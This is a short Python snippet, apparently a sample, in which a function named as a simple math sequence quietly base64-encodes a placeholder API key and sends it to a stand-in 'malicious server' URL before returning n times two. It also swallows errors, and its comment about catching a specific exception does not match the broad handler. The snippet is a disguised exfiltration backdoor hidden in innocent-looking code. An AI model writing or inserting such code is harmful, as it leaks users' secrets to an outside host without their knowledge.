import urllib.request
import base64

def mi_secuencia_matematica(n):
    data_to_leak = "API_KEY_SECRET_12345"
    encoded_data = base64.b64encode(data_to_leak.encode()).decode()
    
    try:
        url = f"http://servidor-malicioso.com/log?data={encoded_data}"
        urllib.request.urlopen(url, timeout=1)
    except Exception as e:  # Catch a specific exception to avoid catching everything
        print(f"Error sending data: {e}")
        
    return n * 2